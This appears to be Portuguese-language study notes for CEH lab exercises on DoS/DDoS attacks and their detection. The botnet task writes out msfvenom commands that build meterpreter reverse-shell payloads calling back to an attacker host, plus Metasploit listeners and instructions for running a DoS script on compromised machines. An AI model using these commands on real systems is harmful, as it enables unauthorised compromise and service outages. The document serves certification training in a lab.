#!/bin/bash



###############
# MOD 10 - Lab 1: Perform DoS and DDoS Attacks using Various Techniques
###############

########
# TASK 1: Perform a DDoS Attack using ISB and UltraDDOS-v2
########

# Objetivo:
#   Realizar ataques DDoS utilizando ferramentas específicas em ambiente controlado.
#   Avaliar impacto em recursos do sistema, como CPU e rede.
#   Identificar vulnerabilidades que podem ser exploradas por ataques de negação de serviço.

# Visão Geral: Ataques DoS e DDoS
#   DoS (Denial of Service)	    Um único host tenta derrubar um serviço, sistema ou rede sobrecarregando seus recursos.
#   DDoS (Distributed DoS)	    Diversos hosts (geralmente zumbis) são usados para gerar um ataque massivo e distribuído.

# Ferramentas Utilizadas no Lab
#   ISB (I'm So Bored)	                Windows 11	                Ferramenta gráfica para ataques DoS/DDoS variados
#   UltraDDOS-v2	                    Windows Server 2022	        Ferramenta para stress DDoS baseada em console
#   Resource Monitor (resmon.exe)	    Windows Server 2019	        Monitoramento de desempenho (CPU, rede, memória)

# Acesso ao ISB (I'm So Bored) no Windows 11
#   Ações:
#       Navegar até: E:\CEH-Tools\CEHv13 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\ISB
#       Executar: ISB (I'm So Bored).exe
#   Se surgir pop-up de UAC (Controle de Conta de Usuário), clicar em "Yes".

# Configuração do Ataque TCP Flood no ISB
#   Parâmetros configurados:
#       IP do Alvo (URL)	10.10.1.19 (Windows Server 2019)
#       Porta	            80 (HTTP)
#       Intervalo (ms)	    10
#       Buffer	            256
#       Threads	            1000
#   Ações:
#       Clicar em "Set Target" após preencher IP e porta.
#       Ir até aba TCP Flood e configurar os parâmetros acima.
#       Manter janela do ISB aberta e não iniciar o ataque ainda.

# Executando Ataque com UltraDDoS v2 no Windows Server 2022
#   Ações:
#       Navegar até: Z:\CEHv13 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\UltraDDoS
#       Executar: ultraddos.exe
#       Se surgir "Open File - Security Warning", clicar em "Run".
#       Na interface UltraDDOS, clicar no botão: "DDOS Attack"
#   Prompts da ferramenta (comandos guiados por janelas):
#       IP/Website alvo	                10.10.1.19
#       Porta	                        80
#       Número de pacotes a enviar	    1000000
#       Número de threads	            1000000
#   Confirmação final para iniciar o ataque	Clicar em OK

# Início do Ataque no ISB (Windows 11)
#   Após iniciar o UltraDDoS, retornar ao ISB (Windows 11).
#   Clicar no botão: "Start Attack".
#   Agora os dois ataques (ISB e UltraDDOS) estão ativos simultaneamente contra o mesmo alvo (10.10.1.19).

# Monitoramento do Impacto no Windows Server 2019
# Ações:
#   No Windows Server 2019, clicar no menu iniciar.
#   Digitar: resmon
#   Executar: "Resource Monitor".
#   Resultado Esperado:
#   Alto uso de CPU (>80%).
#   Eventual indisponibilidade de serviços web (porta 80).
#   Picos de uso de rede (Network I/O).
#   Lentidão geral do sistema.

# Resumo das Técnicas de Ataque Utilizadas
#   Volumétrico	        TCP Flood	        ISB	            IP: 10.10.1.19
#   Volumétrico/Stress	DDoS Packet Flood	UltraDDoS v2	IP: 10.10.1.19

# Conceitos Importantes do Laboratório
#   Tipos de Ataques DoS/DDoS Comuns
#       UDP Flood	            Envia pacotes UDP para consumir largura de banda.
#       ICMP Flood	            Ping em massa para esgotar a largura de banda.
#       Ping of Death	        Pings malformados que causam crash.
#       SYN Flood	            Envia SYNs sem completar o handshake TCP.
#       Slowloris	            Abre conexões HTTP lentas e não as finaliza, esgotando recursos.
#       Application Flood	    Requisições HTTP GET/POST constantes visando aplicativos web.

# Resumo Técnico para Relatório
#   Plataforma:
#       SOs: Windows 11, Windows Server 2022, Windows Server 2019
#       Ferramentas: ISB (Im So Bored), UltraDDOS-v2, Resource Monitor
#   Objetivo:
#       Executar ataques DDoS simultâneos para simular stress de rede
#       Observar impacto direto no desempenho da máquina-alvo
#   Ações Executadas:
#       Configuração e execução do ISB com ataque TCP Flood
#       Lançamento de ataque via UltraDDOS-v2 com 1 milhão de pacotes/threads
#       Monitoramento do alvo com resmon.exe
#   Resultados Esperados:
#       Utilização de CPU >80%
#       Sistema potencialmente travado ou indisponível
#       Comportamento típico de DDoS volumétrico com múltiplas fontes
#   Observações:
#       Ataques realizados em ambiente controlado
#       Simulação visa compreensão defensiva
#       Proibido usar em produção ou internet real


########
# TASK 2: Perform a DDoS Attack using Botnet
########

# Resumo Conceitual
#   Um botnet é uma rede de máquinas comprometidas (bots/zumbis), controladas remotamente via servidor de comando e controle (C2).
#   O atacante usa malwares para assumir o controle de múltiplos sistemas.
#   Em um ataque DDoS, todos os bots enviam requisições simultâneas ao alvo, sobrecarregando sua CPU, RAM, ou largura de banda.
#   Nesta simulação, você compromete 3 máquinas Windows (Windows 11, Windows Server 2019 e 2022) para atacar uma máquina Ubuntu.

# Gerar os Payloads Maliciosos (exploit1, 2 e 3)
sudo su  # Acesso root (senha: toor)
# Gerar payloads .exe com msfvenom:
#   Para Windows 11:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=6969 -f exe > exploit1.exe
#   Para Windows Server 2019:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=9999 -f exe > exploit2.exe
#   Para Windows Server 2022:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=5555 -f exe > exploit3.exe
# Criar Diretório Compartilhado via Apache para os Exploits
mkdir /var/www/html/share                           # Criar diretório
chmod -R 755 /var/www/html/share/                   # Permissão de leitura/execução
chown -R www-data:www-data /var/www/html/share/     # Dono = Apache
# Copiar os arquivos:
cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/
# Iniciar o servidor Apache:
service apache2 start
# Configurar Listeners no Metasploit para Capturar os Bots
#   Abrir 3 terminais (um para cada listener) e usar:
sudo su     # Entrar como root em cada terminal
#   Terminal 1 (porta 6969 - Windows 11)
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"
#   Terminal 2 (porta 9999 - Server 2019)
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 9999; run"
#   Terminal 3 (porta 5555 - Server 2022)
msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 5555; run"
# Executar os Exploits nas Máquinas Windows
#   Acesse via navegador nas vítimas:
http://10.10.1.13/share
# Em cada máquina:
#   Faça download do executável correspondente (exploit1.exe, exploit2.exe, exploit3.exe).
#   Ignore o alerta de segurança.
#   Execute o .exe para abrir sessão meterpreter com o atacante (Parrot Security).
# Subir o Script de Ataque (DDoS) e Executar
#   No terminal meterpreter em cada sessão:
upload /home/attacker/Downloads/eagle-dos.py
#   Inicie o terminal de shell (a partir do Meterpreter):
shell
#   Execute o script de DDoS em Python:
python eagle-dos.py
#   Quando solicitado, informe o IP da máquina-alvo Ubuntu (por exemplo):
10.10.1.9
#   Repita esse processo nos 3 terminais (Windows 11, Server 2019 e Server 2022) para simular um ataque DDoS completo com múltiplos bots.
# Monitorar Ataque com Wireshark na Máquina Alvo (Ubuntu)
#   Na máquina Ubuntu:
sudo wireshark
#   Senha: toor
# Clique em eth0 para capturar pacotes.
#   Verifique IP de origem vindo de:
10.10.1.11 (Windows 11)
10.10.1.19 (Server 2019)
10.10.1.22 (Server 2022)
# Observar o Impacto do Ataque (Ubuntu)
#   Abra o monitor do sistema (System Monitor):
gnome-system-monitor
#   Verifique:
#       Uso de CPU ou memória elevado (por ex: 98.7%)
#       Lento ou travado = efeito real do ataque DDoS.
#   Encerrar o Ataque
#       Reinicie a máquina Ubuntu (caso esteja travada).
#       Volte ao Parrot e feche os terminais Meterpreter ou use:
exit


###############
# MOD 10 - Lab 2: Detect and Protect Against DoS and DDoS Attacks
###############


########
# TASK 1: Detect and Protect Against DDoS Attacks using Anti DDoS Guardian
########

# Objetivo:
#   Detectar e mitigar um ataque DDoS direcionado à máquina Windows 11, utilizando o software Anti DDoS Guardian como ferramenta de proteção.
#   Os ataques são simulados por duas máquinas: Windows Server 2019 e Windows Server 2022, utilizando a ferramenta LOIC (Low Orbit Ion Cannon).

# Máquina Alvo: Windows 11
#   Ações Realizadas
#       Instalação do Anti DDoS Guardian
#   Navegar até:
E:\CEH-Tools\CEHv13 Module 10 Denial-of-Service\DoS and DDoS Protection Tools\Anti DDoS Guardian
#   Executar:
Anti_DDoS_Guardian_setup.exe
#   Etapas do instalador:
#       Clicar em Yes se aparecer UAC.
#       Clicar em Run se aparecer "Open File - Security Warning".
#       Clicar em Next até a tela de "Stop RDP Brute Force".
#           Desmarcar a opção: "Install Stop RDP Brute Force".
#       Selecionar "Create desktop shortcut".
#       Clicar em Install → Finish (com opção "Launch Anti DDoS Guardian" marcada).
#   Primeira Execução
#     Clicar em Continue em todas as telas do assistente de configuração.
#     Clicar em Finish ao final.
#     A interface exibe tráfego de entrada/saída da rede.

# Máquinas de Ataque: Windows Server 2019 e Windows Server 2022
#   Ações Realizadas com a ferramenta LOIC
#       Navegar até:
Z:\CEHv13 Module 10 Denial-of-Service\DoS and DDoS Attack Tools\Low Orbit Ion Cannon (LOIC)
#       Executar:
LOIC.exe
#       (clicar em "Run" se aparecer o aviso de segurança)
#   Configurações no LOIC:
#       IP de destino (alvo):
10.10.1.11
#       Clicar em: Lock on
#       Em Method: selecionar UDP
#       Threads: definir como 5
#       Ajustar a barra de poder para o meio
#   Iniciar ataque:
#       Clicar em:
IMMA CHARGIN MAH LAZER
#       Fazer isso nas duas máquinas atacantes.

# Detecção com Anti DDoS Guardian (Windows 11)
#   Ações Realizadas
#       Observar a quantidade de pacotes de entrada no Anti DDoS Guardian.
#           Origem dos pacotes:
#               IP: 10.10.1.19 → Windows Server 2019
#               IP: 10.10.1.22 → Windows Server 2022
#   Análise detalhada do tráfego:
#       Clique duplo em uma das sessões:
10.10.1.22
#       Janela "Traffic Detail Viewer" será aberta, exibindo dados brutos.
#   Bloqueio dos IPs atacantes
#       No painel esquerdo da janela "Traffic Detail Viewer", clicar em:
Block IP
#       O IP ficará com a linha vermelha e a coluna “Action Taken” indicará o bloqueio.
#   Repetir o procedimento para o outro IP atacante (10.10.1.19).

# Encerramento do Ataque
#   Voltar para as máquinas Windows Server 2019 e 2022.
#   Clicar em:
Stop flooding
#   Fechar o LOIC.

# Limpeza Pós-Teste
#   Em Windows 11:
#       Ir até:
Control Panel → Programs → Programs and Features
#   Desinstalar:
Anti DDoS Guardian

# Técnicas de Detecção (Conceitos Aplicados)
# Activity Profiling
#   Detecta comportamentos fora do padrão com base no número médio de pacotes.
# Sequential Change-point Detection
#   Analisa o tráfego por IP, portas e protocolos ao longo do tempo.
# Wavelet-based Signal Analysis
#   Analisa espectros de frequência do tráfego para identificar padrões anômalos.

